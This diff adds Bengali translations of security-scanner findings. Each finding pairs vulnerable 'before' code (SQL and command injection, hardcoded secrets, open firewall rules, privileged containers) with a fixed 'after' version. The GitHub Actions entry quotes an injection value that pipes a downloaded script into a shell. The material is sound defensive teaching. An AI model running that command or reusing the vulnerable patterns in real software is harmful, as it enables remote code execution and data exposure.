@@ -5135,4 +5135,5258 @@ export const checkTranslations: Partial<Record<TranslatedCheckLang, Record<strin
     },
   },
 },
+  bn: {
+  "supabase-service-role-in-client": {
+    title: "Supabase-এর গোপন কী ব্রাউজারের জন্য তৈরি একটি ফাইলে চলে যায়",
+    description:
+      "একটি পাবলিক প্রিফিক্সযুক্ত ভেরিয়েবল (যেমন NEXT_PUBLIC_, VITE_) অথবা ক্লায়েন্ট-সাইড ফাইল Supabase-এর service role key-কে রেফারেন্স করে। এই কী Row Level Security বাইপাস করে: যদি এটি ব্রাউজার বান্ডেলে চলে যায়, তাহলে যে কেউ এটি পড়ে ডেটাবেসে অ্যাডমিনিস্ট্রেটর হিসেবে কাজ করতে পারে।",
+    fix: {
+      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
+      after: `// app/api/admin/route.ts (শুধু সার্ভার)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
+    },
+  },
+  "hardcoded-secret": {
+    title: "কোডে সরাসরি পাসওয়ার্ড বা গোপন কী লেখা আছে",
+    description:
+      "একটি API কী, টোকেন বা পাসওয়ার্ড এনভায়রনমেন্ট ভেরিয়েবল থেকে না পড়ে সরাসরি লিটারাল ভ্যালু হিসেবে লেখা মনে হচ্ছে। যে কেউ সোর্স কোড (বা রিপোজিটরি, যদি পাবলিক হয়) পড়লে সেই গোপন তথ্য পেয়ে যাবে।",
+    fix: {
+      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
+      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
+    },
+  },
+  "env-file-with-real-values": {
+    title: "প্রজেক্টের আসল পাসওয়ার্ড সহ একটি ফাইল বিশ্লেষণ করা ফাইলগুলোর মধ্যে আছে",
+    description:
+      "আসল মান সহ একটি .env ফাইল (একটি .env.example নয়) বিশ্লেষণে অন্তর্ভুক্ত করা হয়েছে। এই ফাইলটি যদি কোনো রিপোজিটরি বা পাবলিক ডিপ্লয়মেন্টে চলে যায়, তাহলে এতে থাকা প্রতিটি ক্রেডেনশিয়াল প্রকাশিত হয়ে যায়।",
+    fix: {
+      before: `# .env (ভুলবশত কমিট করা হয়েছে)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
+      after: `# .env.example (কমিট করা)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env রিপো থেকে বাইরে থাকে (.gitignore)`,
+    },
+  },
+  "missing-row-level-security": {
+    title: "যে কেউ সব ব্যবহারকারীর ডেটা পড়তে বা পরিবর্তন করতে পারে",
+    description:
+      "Row Level Security নিষ্ক্রিয় করা আছে, অথবা একটি পলিসি কে অনুরোধ করছে তা যাচাই না করেই যে কাউকে অ্যাক্সেস দেয় (USING (true))। প্রতিটি প্রমাণীকৃত ব্যবহারকারী — এমনকি একজন অজ্ঞাতনামা ব্যবহারকারীও — অন্য সবার ডেটা পড়তে বা পরিবর্তন করতে পারে।",
+    fix: {
+      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
+      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
+    },
+  },
+  "sql-injection": {
+    title: "ব্যবহারকারীর দেওয়া একটি মান সরাসরি ডেটাবেস কোয়েরিতে বসানো হয়",
+    description:
+      "প্যারামিটার ব্যবহার না করে সরাসরি একটি স্ট্রিং concatenate বা interpolate করে একটি SQL কোয়েরি তৈরি করা হয়েছে। যদি সেই টেক্সট (এমনকি পরোক্ষভাবেও) একজন ব্যবহারকারীর কাছ থেকে আসে, তাহলে এটি কোয়েরি নিজেই পরিবর্তন করতে পারে — SQL injection।",
+    fix: {
+      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
+      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
+    },
+  },
+  "plaintext-password-storage": {
+    title: "পাসওয়ার্ডগুলো সুরক্ষিত বলে মনে হচ্ছে না",
+    description:
+      "একটি পাসওয়ার্ড ফিল্ড অনুরোধ থেকে যেভাবে এসেছে ঠিক সেভাবেই সংরক্ষণ করা হয়, এবং ফাইলে কোনো হ্যাশিং ফাংশন (bcrypt, argon2, scrypt) দেখা যায় না। ডেটাবেস যদি কখনো compromise হয়, তাহলে প্রতিটি পাসওয়ার্ড সাথে সাথেই ব্যবহারযোগ্য হয়ে যাবে।",
+    fix: {
+      before: `await db.users.insert({ email, password: req.body.password })`,
+      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
+    },
+  },
+  "hardcoded-jwt-secret": {
+    title: "লগইন সাইন করতে ব্যবহৃত সিক্রেট কোডে প্লেইন টেক্সটে লেখা আছে",
+    description:
+      "jwt.sign / jwt.verify-এ পাস করা সিক্রেট (অথবা JWT_SECRET ভেরিয়েবল) এনভায়রনমেন্ট ভেরিয়েবল থেকে না এসে কোডে একটি লিটারাল ভ্যালু। যে কেউ এটি পড়লে যেকোনো ব্যবহারকারীর জন্য বৈধ অ্যাক্সেস টোকেন তৈরি করতে পারবে।",
+    fix: {
+      before: `jwt.sign(payload, "super-secret-key-123")`,
+      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
+    },
+  },
+  "command-injection": {
+    title: "সার্ভারকে বাহ্যিক কমান্ড চালাতে বাধ্য করা যেতে পারে",
+    description:
+      "সিস্টেম কমান্ড চালানো একটি ফাংশন (exec, execSync, spawn) interpolation বা concatenation দিয়ে তৈরি একটি স্ট্রিং গ্রহণ করে। সেই স্ট্রিং-এর একটি অংশ যদি ব্যবহারকারীর ইনপুট থেকে আসে, তাহলে যে এটি নিয়ন্ত্রণ করে সে সার্ভারে যেকোনো কমান্ড চালাতে পারে।",
+    fix: {
+      before: "execSync(`convert ${filename} output.png`)",
+      after: `execFile("convert", [filename, "output.png"])`,
+    },
+  },
+  "path-traversal": {
+    title: "বাইরে থেকে পাথ বেছে নিয়ে সার্ভারের একটি ফাইল পড়া বা লেখা যেতে পারে",
+    description:
+      'একটি ফাইল পড়া, লেখা বা পাঠানো একটি ফাংশন সরাসরি অনুরোধের একটি মান (query, body, params) থেকে পাথ নেয়, এটি অনুমোদিত ফোল্ডারের ভেতরে থাকছে কিনা তা যাচাই না করেই। একজন আক্রমণকারী উদ্দিষ্ট ফোল্ডার থেকে বের হতে "../" প্রবেশ করিয়ে সার্ভারের যেকোনো ফাইল পড়তে বা ওভাররাইট করতে পারে (যেমন ক্রেডেনশিয়ালসহ একটি কনফিগারেশন ফাইল)।',
+    fix: {
+      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
+      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("পাথ অনুমোদিত নয়")\n  res.sendFile(target)\n})`,
+    },
+  },
+  "nosql-injection": {
+    title: "ব্যবহারকারীর দেওয়া একটি মান একটি MongoDB কোয়েরির মধ্যে কোড হিসেবে চালানো হয়",
+    description:
+      "MongoDB-এর $where অপারেটর প্রতিটি ডকুমেন্টের জন্য সার্ভার-সাইড JavaScript চালায় — সেই স্ট্রিংটি যদি ব্যবহারকারীর কাছ থেকে আসা একটি মান concatenate করে তৈরি করা হয়, তাহলে যে এটি নিয়ন্ত্রণ করে সে একটি সাধারণ SQL injection-এর মতো শুধু ফিল্টার পরিবর্তন নয়, বরং ডেটাবেসের প্রসঙ্গে নির্বিচারে কোড চালাতে পারে।",
+    fix: {
+      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
+      after: `db.collection.find({ username: username })`,
+    },
+  },
+  ssti: {
+    title: "ব্যবহারকারীর দেওয়া একটি মানকে ডেটা নয়, একটি টেমপ্লেট হিসেবে ব্যাখ্যা করা হয়",
+    description:
+      "একটি টেমপ্লেট কম্পাইল/রেন্ডার করা একটি ফাংশন একটি নির্দিষ্ট টেমপ্লেট ব্যবহার করে শুধু ডেটা পাস করার বদলে, অনুরোধের একটি মান থেকে পুরো টেমপ্লেটটি গ্রহণ করে। একজন আক্রমণকারী সরাসরি টেমপ্লেট ইঞ্জিনের সিনট্যাক্সে লিখতে পারে (যেমন Jinja2-এর জন্য {{7*7}}) এবং সার্ভারে কোড চালাতে পারে — Server-Side Template Injection, যা প্রায়ই নির্বিচারে কমান্ড execution পর্যন্ত নিয়ে যায়, XSS-এর মতো শুধু একটি ডিসপ্লে সমস্যা নয়।",
+    fix: {
+      before: `return render_template_string(request.args.get("name"))`,
+      after: `return render_template("profile.html", name=request.args.get("name"))`,
+    },
+  },
+  xxe: {
+    title: "XML পার্সারকে ফাইল পড়তে বা বাহ্যিক অনুরোধ পাঠাতে বাধ্য করা যেতে পারে",
+    description:
+      "একটি XML পার্সার (DocumentBuilderFactory) কাছাকাছি লাইনগুলোতে স্পষ্টভাবে বাহ্যিক entities (DOCTYPE) নিষ্ক্রিয় না করেই তৈরি করা হয়েছে। পার্সারটি যদি অবিশ্বস্ত উৎস থেকে XML পায়, তাহলে একজন আক্রমণকারী সার্ভারের ফাইল পড়তে বা এটিকে তার পছন্দের একটি ঠিকানায় যোগাযোগ করাতে একটি বাহ্যিক entity ডিফাইন করতে পারে — XML External Entity।",
+    fix: {
+      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+    },
+  },
+  "docker-hardcoded-secret": {
+    title: "Dockerfile-এর একটি ENV বা ARG নির্দেশে সরাসরি একটি সিক্রেট লেখা আছে",
+    description:
+      "password/secret/token/key-এর মতো নামের একটি ভেরিয়েবলের একটি ENV বা ARG নির্দেশে লিটারাল মান আছে। একটি .env ফাইলের বিপরীতে (যা সাধারণত ইমেজে যায় না), এই মানটি Docker ইমেজেই বেক করা হয়ে যায় — যে কেউ এটি pull করতে বা layer history দেখতে পারে সে এটি উদ্ধার করতে পারবে, Dockerfile-এর পরবর্তী ভার্সনে লাইনটি সরানো হলেও।",
+    fix: {
+      before: `ENV DB_PASSWORD=supersecret123`,
+      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# পাস করা হয় এভাবে: docker build --build-arg DB_PASSWORD=*** (অথবা, আরও ভালো,\n# একটি BuildKit secret mount দিয়ে, যা কখনো layer history-তে যায় না)`,
+    },
+  },
+  "k8s-privileged-container": {
+    title: "Kubernetes manifest-এর একটি container privileged হিসেবে চলে",
+    description:
+      'একটি container-এর securityContext-এ "privileged: true" container ও host-এর মধ্যে স্বাভাবিক isolation প্রায় পুরোপুরি নিষ্ক্রিয় করে দেয়: container host-এর device অ্যাক্সেস করতে পারে, এর নেটওয়ার্ক কনফিগারেশন পরিবর্তন করতে পারে, এবং অনেক ক্ষেত্রে কার্যকরভাবে এটি যে মেশিনে চলছে তাতে root অ্যাক্সেস পেতে পারে। একটি সাধারণ অ্যাপের জন্য প্রায় কখনোই প্রয়োজন হয় না।',
+    fix: {
+      before: `securityContext:\n  privileged: true`,
+      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # শুধু সত্যিই প্রয়োজনীয় capability`,
+    },
+  },
+  "k8s-plaintext-secret-env": {
+    title: "Kubernetes manifest-এর env ভেরিয়েবলে একটি সিক্রেট প্লেইন টেক্সটে লেখা আছে",
+    description:
+      'password/secret/token/key-এর মতো নামের একটি এনভায়রনমেন্ট ভেরিয়েবলের একটি Secret ("valueFrom.secretKeyRef") থেকে না পড়ে একটি লিটারাল মান ("value:") আছে। manifest নিজেই — প্রায়ই একটি রিপোজিটরিতে কমিট করা — তাই সিক্রেটটি প্লেইন টেক্সটে ধারণ করে, যা শুধু কনফিগারেশন পড়তে পারে এমন কারো কাছেও দৃশ্যমান, cluster-এ কমান্ড চালাতে না পারলেও।',
+    fix: {
+      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
+      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
+    },
+  },
+  "terraform-open-security-group": {
+    title: "একটি Terraform security group পুরো ইন্টারনেটের জন্য একটি সংবেদনশীল পোর্ট খুলে দেয়",
+    description:
+      'একটি "cidr_blocks" (0.0.0.0/0, অর্থাৎ যেকোনো IP ঠিকানা সহ) রুল একটি সংবেদনশীল পোর্টের কাছাকাছি — SSH (22), RDP (3389), বা একটি সাধারণ ডেটাবেস পোর্ট (MySQL, Postgres, MongoDB, Redis, SQL Server)। ইন্টারনেটে যে কেউ সেই সার্ভিসে সংযোগ করার চেষ্টা করতে পারে, শুধু যার করা উচিত সে নয়।',
+    fix: {
+      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
+      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # শুধু আপনার প্রাইভেট নেটওয়ার্ক, অথবা একটি bastion host\n}`,
+    },
+  },
+  "gcp-firewall-open-to-internet": {
+    title: "একটি Google Cloud ফায়ারওয়াল রুল পুরো ইন্টারনেটের জন্য একটি সংবেদনশীল পোর্ট খুলে দেয়",
+    description:
+      'একটি "google_compute_firewall" রিসোর্স, যার "source_ranges"-এ 0.0.0.0/0 (যেকোনো IP ঠিকানা) আছে, একটি সংবেদনশীল পোর্টে ট্র্যাফিকের অনুমতি দেয় — SSH (22), RDP (3389), বা একটি সাধারণ ডেটাবেস পোর্ট (MySQL, Postgres, MongoDB, Redis, SQL Server)। ইন্টারনেটে যে কেউ সেই সার্ভিসে সংযোগ করার চেষ্টা করতে পারে, শুধু যার করা উচিত সে নয়।',
+    fix: {
+      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
+      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # শুধু আপনার প্রাইভেট নেটওয়ার্ক, অথবা একটি bastion host\n}`,
+    },
+  },
+  "azure-nsg-open-to-internet": {
+    title: "একটি Azure নেটওয়ার্ক রুল পুরো ইন্টারনেটের জন্য একটি সংবেদনশীল পোর্ট খুলে দেয়",
+    description:
+      'একটি নেটওয়ার্ক সিকিউরিটি রুল ("azurerm_network_security_rule", অথবা "azurerm_network_security_group"-এর ভেতরে একটি "security_rule" ব্লক) যার "source_address_prefix" "*" বা "0.0.0.0/0", direction "Inbound" এবং access "Allow", একটি সংবেদনশীল পোর্টের কাছাকাছি — SSH (22), RDP (3389), বা একটি সাধারণ ডেটাবেস পোর্ট। ইন্টারনেটে যে কেউ সেই সার্ভিসে সংযোগ করার চেষ্টা করতে পারে, শুধু যার করা উচিত সে নয়।',
+    fix: {
+      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
+      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # শুধু আপনার প্রাইভেট নেটওয়ার্ক, অথবা একটি bastion host\n}`,
+    },
+  },
+  "terraform-hardcoded-secret": {
+    title: "একটি Terraform ভেরিয়েবলের ডিফল্ট মান হিসেবে একটি সিক্রেট লেখা আছে",
+    description:
+      'password/secret/token/key-এর মতো নামের একটি ভেরিয়েবলে এর "default"-এ একটি লিটারাল মান আছে। রানটাইমে পাস করা একটি মানের (tfvars, TF_VAR_* এনভায়রনমেন্ট ভেরিয়েবল) বিপরীতে, একটি ডিফল্ট সোর্স কোডে চলে যায় — এবং রিপোজিটরি শেয়ার করা বা পাবলিক হলে, Terraform state-এ অ্যাক্সেস ছাড়াই যে কেউ এটি দেখতে পারে।',
+    fix: {
+      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
+      after: `variable "db_password" {\n  # কোনো ডিফল্ট নেই: একটি .tfvars ফাইল (git-এর বাইরে) বা একটি TF_VAR_db_password এনভায়রনমেন্ট ভেরিয়েবল দিয়ে এটি পাস করুন\n  sensitive = true\n}`,
+    },
+  },
+  "gha-script-injection": {
+    title: "একজন বাহ্যিক ব্যবহারকারীর নিয়ন্ত্রিত একটি মান সরাসরি CI-এর একটি শেল কমান্ডে প্রবেশ করে",
+    description:
+      'একটি GitHub Actions ওয়ার্কফ্লোর "run:" কমান্ড সরাসরি একটি pull request-এর title, একটি branch-এর নাম, বা একটি কমেন্টের টেক্সটের মতো একটি মান interpolate করে — এগুলো সবই একটি বাহ্যিক fork থেকেও pull request বা কমেন্ট খোলা যে কেউ লিখতে পারে। `"; curl malware.sh | sh #` এর মতো একটি মান সেই ওয়ার্কফ্লোতে উপলব্ধ সব সিক্রেটসহ CI-তে নির্বিচারে কমান্ড চালাবে।',
+    fix: {
+      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
+      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # এনভায়রনমেন্ট ভেরিয়েবল হিসেবে পাস করা, কখনো সরাসরি কমান্ডে interpolate করা হয়নি`,
+    },
+  },
+  "gha-pull-request-target-checkout": {
+    title: "ওয়ার্কফ্লোটি রিপোজিটরির সিক্রেটে অ্যাক্সেসসহ একটি বাহ্যিক pull request-এর কোড চালায়",
+    description:
+      'ওয়ার্কফ্লোটি "pull_request_target" ব্যবহার করে — যা একটি সম্পর্কহীন fork থেকে খোলা একটি pull request-এর জন্যও base রিপোজিটরির পারমিশন ও সিক্রেট নিয়ে চলে — এবং base branch নয়, বরং pull request-এর নিজের কোড ("github.event.pull_request.head") চেকআউট করে। যে pull request খোলে সে কার্যকরভাবে সেই সিক্রেটগুলোতে অ্যাক্সেসসহ নিজের কোড চালানোর সুযোগ পায়।',
+    fix: {
+      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
+      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # base branch চেকআউট করে, PR-এর কোড নয় — অথবা বেশি\n      # পারমিশন/সিক্রেট প্রয়োজন না হলে "pull_request_target"-এর বদলে\n      # "pull_request" ব্যবহার করুন।\n      - uses: actions/checkout@v4`,
+    },
+  },
+  "insecure-deserialization": {
+    title: "অনুরোধের ডেটা এমন একটি ফরম্যাটে deserialize করা হয় যা কোড চালাতে পারে",
+    description:
+      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java), বা node-serialize লাইব্রেরি (Node) সরাসরি অনুরোধ থেকে নেওয়া একটি মান deserialize করছে। JSON-এর বিপরীতে, এই ফরম্যাটগুলো deserialization-এর সময়ই কোড represent ও execute করতে পারে — পাঠানো মান যে নিয়ন্ত্রণ করে সে সার্ভারে নির্বিচারে কোড execution পেতে পারে।",
+    fix: {
+      before: `data = pickle.loads(request.data)`,
+      after: `import json\ndata = json.loads(request.data)  # pickle-এর বিপরীতে, parsing করার সময় JSON কখনো কোড চালায় না`,
+    },
+  },
+  "jwt-none-algorithm": {
+    title: 'কোডটি স্পষ্টভাবে sign ছাড়া JWT টোকেন গ্রহণ করে ("none" অ্যালগরিদম)',
+    description:
+      '"none" একটি JWT টোকেন যাচাই করার জন্য গৃহীত অ্যালগরিদমগুলোর মধ্যে আছে। "none" অ্যালগরিদমের একটি টোকেনের যাচাই করার মতো কোনো সিগনেচার নেই: যে কেউ যেকোনো কন্টেন্ট (যেমন একটি admin role) দিয়ে একটি তৈরি করতে পারবে এবং কোডটি এটিকে বৈধ হিসেবে গ্রহণ করবে।',
+    fix: {
+      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
+      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // গৃহীত অ্যালগরিদমগুলোর মধ্যে কখনো "none" অন্তর্ভুক্ত করবেন না`,
+    },
+  },
+  "unprotected-new-table": {
+    title: "একটি নতুন টেবিল সুরক্ষা ছাড়াই তৈরি হয়েছে বলে মনে হচ্ছে",
+    description:
+      "একটি SQL মাইগ্রেশন একটি টেবিল তৈরি করে কিন্তু একই ফাইলে সেই একই টেবিলের জন্য Row Level Security চালু করে না। যতক্ষণ এটি এভাবে থাকে, টেবিলটি শুরু থেকেই কে এটি পড়তে বা লিখতে পারবে তার কোনো বিধিনিষেধ ছাড়াই তৈরি হয়।",
+    fix: {
+      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
+      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
+    },
+  },
+  "permissive-cors": {
+    title: "সাইটটি অন্য যেকোনো ওয়েবসাইট থেকে অনুরোধ গ্রহণ করে",
+    description:
+      "CORS হেডার যেকোনো origin (*) থেকে অনুরোধ গ্রহণ করার জন্য সেট করা আছে, অথবা cors() মিডলওয়্যার কোনো বিধিনিষেধ ছাড়াই ব্যবহার করা হয়েছে। যেকোনো তৃতীয় পক্ষের ওয়েবসাইট ইতিমধ্যে প্রমাণীকৃত একজন ব্যবহারকারীর ব্রাউজার থেকে আপনার API কল করতে পারে।",
+    fix: {
+      before: `app.use(cors())`,
+      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
+    },
+  },
+  "admin-function-missing-auth": {
+    title: "অ্যাডমিন পারমিশনসহ একটি ফাংশন কে এটি ব্যবহার করছে তা যাচাই করে না",
+    description:
+      "অ্যাডমিন অপারেশনের ইঙ্গিত দেয় এমন নামের একটি রুট বা ফাংশনে, কাছাকাছি লাইনগুলোতে কোনো প্রমাণীকরণ বা রোল যাচাই নেই। যে কেউ URL জানলে এটি চালাতে পারবে।",
+    fix: {
+      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+    },
+  },
+  ssrf: {
+    title: "সাইটটিকে বাহ্যিক কোড চালাতে বাধ্য করা যেতে পারে",
+    description:
+      "একটি বহির্গামী HTTP অনুরোধ (fetch, axios) সরাসরি একজন ব্যবহারকারীর অনুরোধ থেকে আসা একটি মান destination URL হিসেবে ব্যবহার করে। একজন ক্ষতিকর ব্যবহারকারী আপনার সার্ভারকে অভ্যন্তরীণ বা নির্বিচারে ঠিকানায় কল করাতে পারে — Server-Side Request Forgery।",
+    fix: {
+      before: `const data = await fetch(req.query.url)`,
+      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL অনুমোদিত নয়")\nconst data = await fetch(req.query.url)`,
+    },
+  },
+  "weak-password-hashing": {
+    title: "পাসওয়ার্ডগুলো এমন একটি পদ্ধতিতে সুরক্ষিত যা এখন সহজেই ভাঙা যায়",
+    description:
+      "একই লাইনে, পাসওয়ার্ডের সাথে যুক্ত একটি মানে md5() বা sha1() প্রয়োগ করা হয়েছে। এই অ্যালগরিদমগুলো হিসাব করতে খুবই দ্রুত: ডেটাবেসসহ একজন আক্রমণকারী প্রতি সেকেন্ডে কোটি কোটি পাসওয়ার্ড চেষ্টা করতে পারে।",
+    fix: {
+      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
+      after: `const hashed = await bcrypt.hash(password, 12)`,
+    },
+  },
+  "k8s-run-as-root": {
+    title: "Kubernetes manifest-এর একটি container root হিসেবে চলার জন্য সেট করা আছে",
+    description:
+      '"runAsUser: 0" বা "runAsNonRoot: false" securityContext-এ container-কে স্পষ্টভাবে root হিসেবে চলতে বাধ্য করে। একজন আক্রমণকারী যদি container-এর ভেতরে কোড চালাতে সক্ষম হয় (যেমন একটি ঝুঁকিপূর্ণ লাইব্রেরি exploit করে), container-এর ভেতরে root হওয়া host-এ escape করা — বা আরও বড় প্রভাব — সহজ করে দেয়।',
+    fix: {
+      before: `securityContext:\n  runAsUser: 0`,
+      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
+    },
+  },
+  "k8s-privilege-escalation": {
+    title: "Kubernetes manifest-এর একটি container শুরুর চেয়ে বেশি privilege পেতে পারে",
+    description:
+      '"allowPrivilegeEscalation: true" securityContext-এ container-এর ভেতরের একটি প্রক্রিয়াকে এটি শুরু করা প্রক্রিয়ার চেয়ে বেশি privilege পেতে দেয় (যেমন একটি setuid বাইনারির মাধ্যমে)। অ্যাপ্লিকেশনের একটি ঝুঁকির সাথে মিলিয়ে, এটি উদ্দিষ্টের চেয়ে বেশি privilege দিয়ে কোড চালানোর দিকে আরেকটি ধাপ।',
+    fix: {
+      before: `securityContext:\n  allowPrivilegeEscalation: true`,
+      after: `securityContext:\n  allowPrivilegeEscalation: false`,
+    },
+  },
+  "k8s-host-namespace-access": {
+    title: "Kubernetes manifest-এর একটি pod host-এর নেটওয়ার্ক, প্রক্রিয়া বা shared memory শেয়ার করে",
+    description:
+      '"hostNetwork", "hostPID" বা "hostIPC" true সেট করা pod-কে তার স্বাভাবিক isolation থেকে বের করে আনে: hostNetwork pod-কে host-এর নেটওয়ার্কে প্রকাশ করে (cluster-এর নেটওয়ার্ক পলিসি bypass করে), hostPID এটিকে host মেশিনের প্রতিটি প্রক্রিয়ার দৃশ্যমানতা দেয়, hostIPC এটিকে host-এর shared memory-তে অ্যাক্সেস দেয়। একটি সাধারণ অ্যাপের জন্য প্রায় কখনোই প্রয়োজন হয় না — সাধারণত শুধু নিম্ন-স্তরের সিস্টেম/মনিটরিং টুলের জন্য।',
+    fix: {
+      before: `spec:\n  hostNetwork: true`,
+      after: `spec:\n  hostNetwork: false`,
+    },
+  },
+  "terraform-s3-block-public-access-disabled": {
+    title: "Terraform-এ ডিফাইন করা একটি S3 বাকেটে Block Public Access নিষ্ক্রিয় করা আছে",
+    description:
+      'অর্থাৎ "aws_s3_bucket_public_access_block"-এর চারটি সুরক্ষার (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) এক বা একাধিক false সেট করা আছে। এর মানে এই নয় যে বাকেটটি ইতিমধ্যে পাবলিক, কিন্তু এটি এমন একটি সুরক্ষা জাল সরিয়ে দেয় যা ভবিষ্যতে ভুলবশত এটি পাবলিক হওয়া আটকাত।',
+    fix: {
+      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
+      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
+    },
+  },
+  "terraform-iam-wildcard-policy": {
+    title: "Terraform-এ ডিফাইন করা একটি IAM পলিসি পূর্ণ অ্যাক্সেস দেয়",
+    description:
+      'action "*" এবং resource "*" সহ একটি statement প্রতিটি AWS সার্ভিস ও রিসোর্সে পূর্ণ অ্যাক্সেস দেয় — এটি প্রয়োগ হওয়ার আগেই, সরাসরি কোড থেকে পড়া, live IAM state-এ ইতিমধ্যে করা একই যাচাই। এটি একটি জরুরি রোলের জন্য উদ্দিষ্ট হতে পারে, কিন্তু নিশ্চিত করা উচিত: দৈনন্দিন ব্যবহারের জন্য শুধু সত্যিই প্রয়োজনীয় পারমিশন দিন।',
+    fix: {
+      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
+      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
+    },
+  },
+  "gcp-storage-bucket-public": {
+    title: "একটি Google Cloud Storage বাকেট যে কারো জন্য পঠনযোগ্য করা হয়েছে",
+    description:
+      'একটি "google_storage_bucket_iam_member" বা "google_storage_bucket_iam_binding" রিসোর্স "allUsers" বা "allAuthenticatedUsers"-কে একটি রোল দেয় — প্রথমটি বাকেটটিকে একটি Google অ্যাকাউন্ট ছাড়াই ইন্টারনেটে যে কারো জন্য পঠনযোগ্য করে তোলে; দ্বিতীয়টি যেকোনো Google অ্যাকাউন্টধারীর জন্য, শুধু যার অ্যাক্সেস থাকা উচিত তার জন্য নয়।',
+    fix: {
+      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
+      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # শুধু যার সত্যিই অ্যাক্সেস থাকা উচিত, allUsers/allAuthenticatedUsers নয়\n}`,
+    },
+  },
+  "azure-storage-public-access": {
+    title: "একটি Azure স্টোরেজ অ্যাকাউন্টে পাবলিক blob অ্যাক্সেস সক্রিয় করা আছে",
+    description:
+      '"allow_blob_public_access" একটি "azurerm_storage_account"-এ true সেট করা আছে: পাবলিক করা একটি blob/container-এর URL যে কেউ জানলে, কোনো প্রমাণীকরণ ছাড়াই এটি পড়তে পারে।',
+    fix: {
+      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
+      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
+    },
+  },
+  "gcp-iam-overly-broad-role": {
